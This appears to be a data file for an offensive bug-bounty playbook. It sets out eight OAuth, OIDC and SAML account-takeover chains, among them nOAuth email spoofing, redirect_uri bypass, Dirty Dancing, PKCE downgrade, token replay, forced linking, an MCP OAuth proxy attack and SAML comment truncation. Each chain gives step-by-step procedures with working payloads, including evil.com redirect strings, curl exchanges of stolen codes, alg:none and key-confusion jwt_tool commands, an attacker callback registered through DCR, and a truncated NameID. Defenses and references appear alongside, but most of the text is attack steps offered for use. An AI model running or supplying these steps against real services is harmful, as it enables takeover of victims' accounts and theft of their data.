chains.title: nOAuth: account takeover from a single email via "Sign in with Microsoft"
chains.impact: Full account takeover of any victim from their email with no interaction; works across tenants. nOAuth-class bugs on large SaaS pay out.
chains.why: The attacker simply changes the email attribute in a throwaway Entra ID tenant to the victim's address, and one click of "Sign in with Microsoft" logs them in as the victim - with no phishing and no token theft.
chains.precondition: The target uses OIDC "Sign in with Microsoft" via the multi-tenant common endpoint and matches users by the mutable email claim instead of the immutable sub+iss (or oid+tid), ignoring email_verified.
chains.realWorld: Descope "nOAuth" (Microsoft Entra ID, June 2023); Doyensec "Common OAuth Vulnerabilities", takeover via a mutable claim (January 2025).
chains.defense: Identify by the immutable sub+iss (or oid+tid), reject email_verified=false, and never trust mutable email/upn for account matching.

steps.title: Verify that the app matches by email
steps.detail: decode the ID token from a test login; compare sub/oid/tid vs email; test whether changing the IdP email re-points the app account

steps.title: Set the attacker user's email equal to the victim's email
steps.detail: Graph PATCH /users/{id} body {"mail":"{USER_B}"} (no domain/claim verification of the email claim)

steps.title: Start "Sign in with Microsoft" with the attacker identity
steps.detail: /authorize?client_id={CLIENT_ID}&response_type=code&scope=openid email&redirect_uri={REDIRECT_URI}; the RP receives an id_token with email={USER_B}

steps.title: The RP matches by email and grants access to the victim's account
steps.detail: confirm the session is the victim's, then pivot to data/admin

steps.title: Generalize: check aud/azp/iss and email_verified handling
steps.detail: most vulnerable RPs never check iss/tid and accept email_verified=false

chains.title: The allow-list lie: redirect_uri bypass and authorization-code theft
chains.impact: Theft of the victim's authorization code (or access_token) and exchanging it for full account takeover; path-traversal variants have paid, and on confidential-client SSO this is usually Critical.
chains.why: The authorization server "validates" redirect_uri, but a single /../, %252F, a registered neighboring subdomain, or the client's own open redirect turns an allowed URI into an exfiltration point.
chains.precondition: The AS matches by prefix/substring/regex instead of exact, or the client's allowed URL contains an open redirect or attacker-influenced content.
chains.realWorld: pixiv HackerOne #1861974 (path traversal in redirect_uri, $2k); GSA #665651 and report #405100 (token theft via redirect_uri); Doyensec's exact-matching recommendation (2025).
chains.defense: Exact string matching of redirect_uri (scheme+host+port+path), no wildcards or subpaths, and eliminate open redirects on every allowed host.

steps.title: Fingerprint the redirect_uri validation
steps.detail: test exact vs prefix vs subdomain vs path; try appended path, @evil.com, .evil.com, trailing ?/#, and double-encoding

steps.title: Bypass via path traversal / encoding
steps.detail: redirect_uri=https://client.com/cb/../../redirect?u=https://evil.com; vary %2F, %252F, %5C, /./, ;, %23

steps.title: Chain a registered subdomain or the client's open redirect
steps.detail: redirect_uri=https://allowed.client.com/out?next=https://evil.com (allow-listed host forwards the code onward)

steps.title: Deliver the authorize link and intercept the redirect
steps.detail: listener logs ?code= / #access_token= and immediately POSTs to /token

steps.title: Exchange the stolen code for tokens
steps.detail: curl -d grant_type=authorization_code -d code=... -d redirect_uri={REDIRECT_URI} -d client_id={CLIENT_ID} https://as/token

chains.title: Dirty Dancing: token theft through the client's own pages
chains.impact: Exfiltration of code/access_token/id_token with no redirect_uri bug at all, through the client's legitimate pages, followed by takeover; Detectify chained this at several major providers.
chains.why: The attack assembles a "weird machine" out of response_type/response_mode switching, half-broken flows, and window.opener/postMessage/Referer/history to siphon credentials through the client's trusted sources.
chains.precondition: The client has a same-domain page that reflects URL parameters, a postMessage listener weak on origin, or a callback leaking the fragment via Referer/third-party JS, and the AS allows switching response_type/response_mode.
chains.realWorld: Frans Rosen / Detectify Labs, "Account hijacking using Dirty Dancing in sign-in OAuth-flows" (2022).
chains.defense: Pin response_type/response_mode per client, strictly verify origin in postMessage, set Referrer-Policy: no-referrer on callback pages, and never reflect fragment parameters.

steps.title: Map the leak points on the allowed origin
steps.detail: find reflective pages, postMessage handlers lacking e.origin checks, third-party JS, and Referer-leaking redirects/images

steps.title: Switch the flow into a more "leaky" form
steps.detail: change response_type=code to "token id_token" and/or response_mode=fragment/form_post so the credential lands where a sink can read it

steps.title: "Break the state" so the credentials land on the right page
steps.detail: pick a deeper allow-listed redirect_uri that fails open and exposes location.hash / location.search

steps.title: Exfiltrate via opener / postMessage / Referer / history
steps.detail: popup reads opener.location.hash; or rogue postMessage to a weak listener; or force an outbound request leaking Referer: ...#access_token=

steps.title: Replay the leaked credentials
steps.detail: curl -H "Authorization: Bearer STOLEN_TOKEN" https://api/me; or exchange the leaked code at /token

chains.title: PKCE downgrade + authorization-code injection: removing the protection itself
chains.impact: Injecting the victim's (or attacker's) authorization code into the other party's session for account takeover, bypassing the primary protection for public clients.
chains.why: PKCE is "enabled", but since the AS only requires it when code_challenge is present, the attacker simply drops the parameter - and the whole protection evaporates.
chains.precondition: The AS supports but does not require PKCE (engages it only when code_challenge is present), and the client does not use or incorrectly validates state.
chains.realWorld: RFC 9700 "Best Current Practice for OAuth 2.0 Security" (2025), sections on PKCE downgrade and authorization-code injection; OAuth 2.1 makes PKCE mandatory.
chains.defense: Accept code_verifier at /token only if code_challenge was present at /authorize, require S256, and issue single-use, short-lived, client-bound codes.

steps.title: Probe PKCE enforcement
steps.detail: start a flow, strip code_challenge/code_challenge_method, confirm the AS still issues a code and /token succeeds without code_verifier

steps.title: Downgrade the authorization request
steps.detail: remove code_challenge (and try S256->plain if accepted); ensure no usable state

steps.title: Inject the code across sessions
steps.detail: capture the victim code front-channel and inject it into your /token, or inject your code into the victim session for forced login

steps.title: Exchange without a verifier
steps.detail: curl -d grant_type=authorization_code -d code=VICTIM_CODE -d redirect_uri={REDIRECT_URI} -d client_id={CLIENT_ID} https://as/token (no code_verifier)

steps.title: Test replay and cross-client reuse
steps.detail: confirm whether codes are single-use, short-lived, and bound to the requesting client

chains.title: Pass-the-Token: when the RP doesn't check who the token was issued to
chains.impact: Authentication as any victim by replaying a token/assertion issued for a different client or site, or by forging an unsigned/HMAC-confused ID token; Salt-class bugs affected billions of social-login users.
chains.why: The RP treats a "valid-looking token" as a "token for me", so the attacker's token from their own OAuth app or a self-signed alg:none JWT logs them in as the victim.
chains.precondition: The RP accepts an access_token/id_token/code from a user-controlled parameter and does not verify that the signature, aud/azp, and iss bind the credential to this specific RP.
chains.realWorld: Salt Labs research on OAuth token verification (2023): Grammarly, Vidio, Bukalapak ("Pass-The-Token"), Expo CVE-2023-28131, Booking.com; plus the classic JWT alg=none / RS256-HS256 confusion.
chains.defense: Verify the signature against the provider's JWKS, pin alg, and require aud/azp==your client_id, iss==the expected IdP, and a fresh nonce; never accept tokens from user parameters without these checks.

steps.title: Find where the RP accepts the credential
steps.detail: look for client-side POST {access_token|code|id_token} to the RP's own /auth/social verify endpoint

steps.title: Pass the token across clients
steps.detail: mint an access_token via your own OAuth app, then substitute it (or swap code->access_token) into the victim RP's verify call

steps.title: Confuse the ID-token signature
steps.detail: craft id_token with alg:none, or RS256->HS256 key confusion (HMAC-sign with the IdP public key), tampering sub/email
steps.success: the RP accepts the forged id_token and logs in as the victim

steps.title: Exploit aud / azp / iss confusion
steps.detail: reuse a token whose aud is a different client, or whose iss is an IdP the RP did not expect (cross-IdP Sign in with X)

steps.title: Forge and replay
steps.detail: jwt_tool <id_token> -X a (alg:none); jwt_tool <id_token> -X k -pk jwks_pub.pem (key confusion); POST to /auth/social

chains.title: Plant or seize: forced linking and account pre-hijacking
chains.impact: Linking the attacker's federated identity to the victim's account (or planting a dormant foothold before the victim registers) for a durable takeover that survives a password reset; in the research ~35 of the 75 top sites were vulnerable.
chains.why: Two timing tricks against account-linking logic: one hits the link callback with a missing state, the other starts before the victim even has an account.
chains.precondition: The "link social account" callback does not bind state to the session (missing/static/predictable), or the site allows seeding/merging an account on the victim's email without proof of ownership.
chains.realWorld: Sudhodanan and Paverd, "Pre-hijacked accounts" (USENIX Security 2022; MSRC); OAuth-CSRF/forced-linking labs in the PortSwigger Web Security Academy.
chains.defense: Mandatory single-use session-bound state, re-authentication before linking, verification of the email/identifier before the account becomes usable, and session reset plus unlinking of federated identities on password change.

steps.title: Test state binding on the link/login callback
steps.detail: remove/replay/guess state; see if the callback still links or logs in

steps.title: Forced linking via login CSRF
steps.detail: run the IdP flow yourself, keep the code unused, then auto-submit https://target/oauth/callback?code=ATTACKER_CODE (no state) into the victim's authenticated session

steps.title: Classic-Federated Merge (CFM)
steps.detail: pre-create a classic password account on victim@x.com; when the victim later Signs in with Google, the site silently merges into one account you both hold

steps.title: Trojan Identifier (TID)
steps.detail: attach an attacker-controlled federated id or recovery (phone / 2nd email) that survives the victim's password reset

steps.title: US / UEC and Non-Verifying IdP (NV)
steps.detail: keep a long-lived session alive across takeover, queue an email-change to the attacker, or assert the victim's email via an IdP that sends email_verified=false

steps.title: Regain access after the victim onboards
steps.detail: use the surviving session/identifier/recovery to regain the now-populated account

chains.title: MCP-in-the-Middle: one-click SaaS takeover via an OAuth proxy
chains.impact: One click gives the attacker full, persistent access to the victim's connected SaaS through the access/refresh tokens stored by the MCP server; demonstrated on Square's production MCP server in 2025.
chains.why: The MCP "server in the middle" is simultaneously the authorization server for clients and the single upstream OAuth client, so a static client_id plus DCR without redirect_uri validation nullify the cached consent for all prior users.
chains.precondition: The MCP server proxies OAuth with a shared static upstream client_id, supports Dynamic Client Registration without redirect_uri validation or carries redirect_uri inside an unbound state, and the victim previously authorized the MCP server.
chains.realWorld: Obsidian Security "When MCP Meets OAuth: Common Pitfalls Leading to One-Click Account Takeover" (Square MCP, July-September 2025); MCP authorization spec update / SEP-991 Client ID Metadata Documents (November 2025).
chains.defense: Validate redirect_uri against an allow-list (including for DCR), bind state to a __Host- prefixed cookie, require consent at the MCP level, and prefer Client ID Metadata Documents over open DCR.

steps.title: Recon the MCP auth surface
steps.detail: fetch /.well-known/oauth-authorization-server and protected-resource metadata; inspect DCR (/register) and the shared upstream client_id

steps.title: Smuggle a callback through DCR
steps.detail: POST /register {"redirect_uris":["https://{COLLAB}/cb"]}; if unvalidated you now own a valid callback

steps.title: Hide the attacker's redirect_uri in state
steps.detail: base64 state embedding {"redirect_uri":"https://{COLLAB}/cb"}; cached consent for the shared client_id means no prompt fires

steps.title: Pre-approve and hand the link to the victim
steps.detail: complete the MCP consent yourself, capture the upstream AS URL (e.g. mcp.squareup.com/authorize, client sq0idp-...), and send that one-click link

steps.title: Bypass weak session binding
steps.detail: if the consent cookie lacks __Host- / session binding, inject it via subdomain (e.g. sto.wix.com) or XSS so the victim callback validates in attacker context

steps.title: Collect code -> tokens -> refresh tokens
steps.detail: exchange the captured code at /token, then persist with the long-lived refresh_token the MCP server stores for durable access

chains.title: SAML comment truncation: log in as anyone with a valid signature
chains.impact: Authentication to a SAML SP as an arbitrary user (including admins) via a response the IdP actually signed for the attacker's account; full SSO takeover across all applications behind that IdP.
chains.why: An XML comment inside NameID forces a vulnerable parser to return only the text before the comment, silently truncating the signed (but attacker-owned) identity down to the victim's identity without breaking the signature.
chains.precondition: The SP uses a SAML library whose DOM text extraction loses text nodes adjacent to a comment, or verifies the signature without requiring that it cover the claimed NameID/assertion (signature wrapping).
chains.realWorld: Duo Labs / Kelby Ludwig SAML comment-truncation disclosure (2018): CVE-2017-11427 python-saml, CVE-2017-11428 ruby-saml, CVE-2017-11429 saml2-js, CVE-2017-11430 omniauth-saml, CVE-2018-0489 Shibboleth.
chains.defense: Canonicalize and extract NameID after signature verification, reject comment nodes in identity fields, verify that the signature reference points to the consumed assertion, and update SAML libraries to fixed versions.

steps.title: Obtain one valid signed SAML response
steps.detail: register/log in with your own IdP account (e.g. user@user.com.attacker.com) and capture the SAMLResponse

steps.title: NameID injection via comment-truncation
steps.detail: <NameID>{USER_B}<!---->.attacker.com</NameID> so the parser returns only {USER_B} while the signature stays valid
steps.success: log in as the victim with a valid signature

steps.title: Fallback: XML Signature Wrapping (XSW)
steps.detail: wrap a forged unsigned <Assertion> (with the victim NameID) alongside the original signed assertion so validation checks one node and the app consumes the other

steps.title: Automate the mutation in Burp
steps.detail: use SAML Raider to clone/edit the assertion, apply the 8 XSW variants, and remove/relocate the Signature reference

steps.title: Replay against the SP ACS
steps.detail: POST the tampered SAMLResponse to the SP AssertionConsumerService and confirm you are logged in as the victim
